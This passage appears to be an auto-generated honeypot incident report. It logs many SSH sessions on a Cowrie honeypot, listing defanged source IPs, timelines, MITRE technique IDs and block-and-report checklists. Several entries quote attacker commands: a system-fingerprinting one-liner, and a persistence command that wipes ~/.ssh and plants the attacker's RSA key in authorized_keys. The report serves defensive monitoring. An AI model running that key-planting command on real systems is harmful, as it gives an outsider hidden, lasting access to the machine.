| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:33:43` | `cowrie.session.connect` |
| `2026-07-05 05:33:44` | `cowrie.client.version` |
| `2026-07-05 05:33:44` | `cowrie.client.kex` |
| `2026-07-05 05:33:49` | `cowrie.login.success` |
| `2026-07-05 05:33:52` | `cowrie.session.params` |
| `2026-07-05 05:33:52` | `cowrie.command.input` |
| `2026-07-05 05:33:52` | `cowrie.command.input` |
| `2026-07-05 05:33:52` | `cowrie.command.input` |
| `2026-07-05 05:33:52` | `cowrie.command.input` |
| `2026-07-05 05:33:52` | `cowrie.command.input` |
| `2026-07-05 05:33:52` | `cowrie.command.success` |
| `2026-07-05 05:33:52` | `cowrie.command.input` |
| `2026-07-05 05:33:52` | `cowrie.command.input` |
| `2026-07-05 05:33:52` | `cowrie.command.input` |
| `2026-07-05 05:33:52` | `cowrie.command.input` |
| `2026-07-05 05:33:54` | `cowrie.log.closed` |
| `2026-07-05 05:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae1754f43eb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:34 |
| **Last Seen** | 2026-07-05 05:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:34:09` | `cowrie.session.connect` |
| `2026-07-05 05:34:10` | `cowrie.client.version` |
| `2026-07-05 05:34:10` | `cowrie.client.kex` |
| `2026-07-05 05:34:14` | `cowrie.login.success` |
| `2026-07-05 05:34:17` | `cowrie.session.params` |
| `2026-07-05 05:34:17` | `cowrie.command.input` |
| `2026-07-05 05:34:17` | `cowrie.command.input` |
| `2026-07-05 05:34:17` | `cowrie.command.input` |
| `2026-07-05 05:34:17` | `cowrie.command.input` |
| `2026-07-05 05:34:17` | `cowrie.command.input` |
| `2026-07-05 05:34:17` | `cowrie.command.success` |
| `2026-07-05 05:34:17` | `cowrie.command.input` |
| `2026-07-05 05:34:17` | `cowrie.command.input` |
| `2026-07-05 05:34:17` | `cowrie.command.input` |
| `2026-07-05 05:34:17` | `cowrie.command.input` |
| `2026-07-05 05:34:19` | `cowrie.log.closed` |
| `2026-07-05 05:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8704c876830d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 05:34 |
| **Last Seen** | 2026-07-05 05:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:34:43` | `cowrie.session.connect` |
| `2026-07-05 05:34:43` | `cowrie.client.version` |
| `2026-07-05 05:34:43` | `cowrie.client.kex` |
| `2026-07-05 05:34:43` | `cowrie.login.success` |
| `2026-07-05 05:34:43` | `cowrie.direct-tcpip.request` |
| `2026-07-05 05:34:44` | `cowrie.direct-tcpip.data` |
| `2026-07-05 05:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b24b5b7c7ac

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:35 |
| **Last Seen** | 2026-07-05 05:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:35:12` | `cowrie.session.connect` |
| `2026-07-05 05:35:13` | `cowrie.client.version` |
| `2026-07-05 05:35:13` | `cowrie.client.kex` |
| `2026-07-05 05:35:19` | `cowrie.login.success` |
| `2026-07-05 05:35:21` | `cowrie.session.params` |
| `2026-07-05 05:35:21` | `cowrie.command.input` |
| `2026-07-05 05:35:21` | `cowrie.command.input` |
| `2026-07-05 05:35:21` | `cowrie.command.input` |
| `2026-07-05 05:35:21` | `cowrie.command.input` |
| `2026-07-05 05:35:21` | `cowrie.command.input` |
| `2026-07-05 05:35:21` | `cowrie.command.success` |
| `2026-07-05 05:35:21` | `cowrie.command.input` |
| `2026-07-05 05:35:21` | `cowrie.command.input` |
| `2026-07-05 05:35:21` | `cowrie.command.input` |
| `2026-07-05 05:35:21` | `cowrie.command.input` |
| `2026-07-05 05:35:23` | `cowrie.log.closed` |
| `2026-07-05 05:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea2a5c1ffc9a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:35 |
| **Last Seen** | 2026-07-05 05:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:35:37` | `cowrie.session.connect` |
| `2026-07-05 05:35:38` | `cowrie.client.version` |
| `2026-07-05 05:35:38` | `cowrie.client.kex` |
| `2026-07-05 05:35:41` | `cowrie.login.success` |
| `2026-07-05 05:35:43` | `cowrie.session.params` |
| `2026-07-05 05:35:43` | `cowrie.command.input` |
| `2026-07-05 05:35:43` | `cowrie.command.input` |
| `2026-07-05 05:35:43` | `cowrie.command.input` |
| `2026-07-05 05:35:43` | `cowrie.command.input` |
| `2026-07-05 05:35:43` | `cowrie.command.input` |
| `2026-07-05 05:35:43` | `cowrie.command.success` |
| `2026-07-05 05:35:43` | `cowrie.command.input` |
| `2026-07-05 05:35:43` | `cowrie.command.input` |
| `2026-07-05 05:35:43` | `cowrie.command.input` |
| `2026-07-05 05:35:43` | `cowrie.command.input` |
| `2026-07-05 05:35:44` | `cowrie.log.closed` |
| `2026-07-05 05:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bdae944d198

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:36 |
| **Last Seen** | 2026-07-05 05:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:36:39` | `cowrie.session.connect` |
| `2026-07-05 05:36:40` | `cowrie.client.version` |
| `2026-07-05 05:36:40` | `cowrie.client.kex` |
| `2026-07-05 05:36:45` | `cowrie.login.success` |
| `2026-07-05 05:36:48` | `cowrie.session.params` |
| `2026-07-05 05:36:48` | `cowrie.command.input` |
| `2026-07-05 05:36:48` | `cowrie.command.input` |
| `2026-07-05 05:36:48` | `cowrie.command.input` |
| `2026-07-05 05:36:48` | `cowrie.command.input` |
| `2026-07-05 05:36:48` | `cowrie.command.input` |
| `2026-07-05 05:36:48` | `cowrie.command.success` |
| `2026-07-05 05:36:48` | `cowrie.command.input` |
| `2026-07-05 05:36:48` | `cowrie.command.input` |
| `2026-07-05 05:36:48` | `cowrie.command.input` |
| `2026-07-05 05:36:48` | `cowrie.command.input` |
| `2026-07-05 05:36:49` | `cowrie.log.closed` |
| `2026-07-05 05:36:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60dd7aaabe01

| Field | Detail |
|---|---|
| **Source IP** | `222.232.176[.]7` |
| **First Seen** | 2026-07-05 05:36 |
| **Last Seen** | 2026-07-05 05:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:36:51` | `cowrie.session.connect` |
| `2026-07-05 05:36:51` | `cowrie.client.version` |
| `2026-07-05 05:36:52` | `cowrie.client.kex` |
| `2026-07-05 05:36:53` | `cowrie.login.success` |
| `2026-07-05 05:36:53` | `cowrie.session.params` |
| `2026-07-05 05:36:53` | `cowrie.command.input` |
| `2026-07-05 05:36:53` | `cowrie.command.failed` |
| `2026-07-05 05:36:54` | `cowrie.log.closed` |
| `2026-07-05 05:36:55` | `cowrie.session.params` |
| `2026-07-05 05:36:55` | `cowrie.command.input` |
| `2026-07-05 05:36:55` | `cowrie.session.file_download` |
| `2026-07-05 05:36:55` | `cowrie.log.closed` |
| `2026-07-05 05:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.232.176[.]7` to AbuseIPDB if not already reported
- [ ] Block `222.232.176[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4612c8ec504

| Field | Detail |
|---|---|
| **Source IP** | `222.232.176[.]7` |
| **First Seen** | 2026-07-05 05:36 |
| **Last Seen** | 2026-07-05 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:36:55` | `cowrie.session.connect` |
| `2026-07-05 05:36:55` | `cowrie.client.version` |
| `2026-07-05 05:36:55` | `cowrie.client.kex` |
| `2026-07-05 05:36:56` | `cowrie.login.success` |
| `2026-07-05 05:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.232.176[.]7` to AbuseIPDB if not already reported
- [ ] Block `222.232.176[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea4f784abfaf

| Field | Detail |
|---|---|
| **Source IP** | `222.232.176[.]7` |
| **First Seen** | 2026-07-05 05:36 |
| **Last Seen** | 2026-07-05 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:36:57` | `cowrie.session.connect` |
| `2026-07-05 05:36:57` | `cowrie.client.version` |
| `2026-07-05 05:36:57` | `cowrie.client.kex` |
| `2026-07-05 05:36:58` | `cowrie.login.success` |
| `2026-07-05 05:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.232.176[.]7` to AbuseIPDB if not already reported
- [ ] Block `222.232.176[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f1afbdcee0b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:37 |
| **Last Seen** | 2026-07-05 05:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:37:05` | `cowrie.session.connect` |
| `2026-07-05 05:37:06` | `cowrie.client.version` |
| `2026-07-05 05:37:06` | `cowrie.client.kex` |
| `2026-07-05 05:37:09` | `cowrie.login.success` |
| `2026-07-05 05:37:11` | `cowrie.session.params` |
| `2026-07-05 05:37:11` | `cowrie.command.input` |
| `2026-07-05 05:37:11` | `cowrie.command.input` |
| `2026-07-05 05:37:11` | `cowrie.command.input` |
| `2026-07-05 05:37:11` | `cowrie.command.input` |
| `2026-07-05 05:37:11` | `cowrie.command.input` |
| `2026-07-05 05:37:11` | `cowrie.command.success` |
| `2026-07-05 05:37:11` | `cowrie.command.input` |
| `2026-07-05 05:37:11` | `cowrie.command.input` |
| `2026-07-05 05:37:11` | `cowrie.command.input` |
| `2026-07-05 05:37:11` | `cowrie.command.input` |
| `2026-07-05 05:37:12` | `cowrie.log.closed` |
| `2026-07-05 05:37:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90963fa1b798

| Field | Detail |
|---|---|
| **Source IP** | `106.13.183[.]241` |
| **First Seen** | 2026-07-05 05:37 |
| **Last Seen** | 2026-07-05 05:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:37:41` | `cowrie.session.connect` |
| `2026-07-05 05:37:41` | `cowrie.client.version` |
| `2026-07-05 05:37:41` | `cowrie.client.kex` |
| `2026-07-05 05:37:42` | `cowrie.login.success` |
| `2026-07-05 05:37:43` | `cowrie.session.params` |
| `2026-07-05 05:37:43` | `cowrie.command.input` |
| `2026-07-05 05:37:43` | `cowrie.command.failed` |
| `2026-07-05 05:37:44` | `cowrie.log.closed` |
| `2026-07-05 05:37:45` | `cowrie.session.params` |
| `2026-07-05 05:37:45` | `cowrie.command.input` |
| `2026-07-05 05:37:45` | `cowrie.session.file_download` |
| `2026-07-05 05:37:45` | `cowrie.log.closed` |
| `2026-07-05 05:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.183[.]241` to AbuseIPDB if not already reported
- [ ] Block `106.13.183[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59cb1567f599

| Field | Detail |
|---|---|
| **Source IP** | `106.13.183[.]241` |
| **First Seen** | 2026-07-05 05:37 |
| **Last Seen** | 2026-07-05 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:37:45` | `cowrie.session.connect` |
| `2026-07-05 05:37:45` | `cowrie.client.version` |
| `2026-07-05 05:37:45` | `cowrie.client.kex` |
| `2026-07-05 05:37:46` | `cowrie.login.success` |
| `2026-07-05 05:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.183[.]241` to AbuseIPDB if not already reported
- [ ] Block `106.13.183[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6def7fc74dd2

| Field | Detail |
|---|---|
| **Source IP** | `106.13.183[.]241` |
| **First Seen** | 2026-07-05 05:37 |
| **Last Seen** | 2026-07-05 05:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:37:47` | `cowrie.session.connect` |
| `2026-07-05 05:37:47` | `cowrie.client.version` |
| `2026-07-05 05:37:47` | `cowrie.client.kex` |
| `2026-07-05 05:37:49` | `cowrie.login.success` |
| `2026-07-05 05:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.183[.]241` to AbuseIPDB if not already reported
- [ ] Block `106.13.183[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60d967a89a78

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 05:37 |
| **Last Seen** | 2026-07-05 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:37:54` | `cowrie.session.connect` |
| `2026-07-05 05:37:54` | `cowrie.client.version` |
| `2026-07-05 05:37:54` | `cowrie.client.kex` |
| `2026-07-05 05:37:54` | `cowrie.login.success` |
| `2026-07-05 05:37:55` | `cowrie.session.params` |
| `2026-07-05 05:37:55` | `cowrie.command.input` |
| `2026-07-05 05:37:55` | `cowrie.log.closed` |
| `2026-07-05 05:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e006b216daf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:38 |
| **Last Seen** | 2026-07-05 05:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:38:05` | `cowrie.session.connect` |
| `2026-07-05 05:38:06` | `cowrie.client.version` |
| `2026-07-05 05:38:06` | `cowrie.client.kex` |
| `2026-07-05 05:38:11` | `cowrie.login.success` |
| `2026-07-05 05:38:14` | `cowrie.session.params` |
| `2026-07-05 05:38:14` | `cowrie.command.input` |
| `2026-07-05 05:38:14` | `cowrie.command.input` |
| `2026-07-05 05:38:14` | `cowrie.command.input` |
| `2026-07-05 05:38:14` | `cowrie.command.input` |
| `2026-07-05 05:38:14` | `cowrie.command.input` |
| `2026-07-05 05:38:14` | `cowrie.command.success` |
| `2026-07-05 05:38:14` | `cowrie.command.input` |
| `2026-07-05 05:38:14` | `cowrie.command.input` |
| `2026-07-05 05:38:14` | `cowrie.command.input` |
| `2026-07-05 05:38:14` | `cowrie.command.input` |
| `2026-07-05 05:38:15` | `cowrie.log.closed` |
| `2026-07-05 05:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-532c7af5517b

| Field | Detail |
|---|---|
| **Source IP** | `121.31.210[.]125` |
| **First Seen** | 2026-07-05 05:38 |
| **Last Seen** | 2026-07-05 05:43 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:38:18` | `cowrie.session.connect` |
| `2026-07-05 05:38:18` | `cowrie.client.version` |
| `2026-07-05 05:38:18` | `cowrie.client.kex` |
| `2026-07-05 05:38:19` | `cowrie.login.success` |
| `2026-07-05 05:38:20` | `cowrie.session.params` |
| `2026-07-05 05:38:20` | `cowrie.command.input` |
| `2026-07-05 05:38:20` | `cowrie.command.failed` |
| `2026-07-05 05:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.31.210[.]125` to AbuseIPDB if not already reported
- [ ] Block `121.31.210[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26f85542c39

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 05:38 |
| **Last Seen** | 2026-07-05 05:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:38:20` | `cowrie.session.connect` |
| `2026-07-05 05:38:21` | `cowrie.client.version` |
| `2026-07-05 05:38:21` | `cowrie.client.kex` |
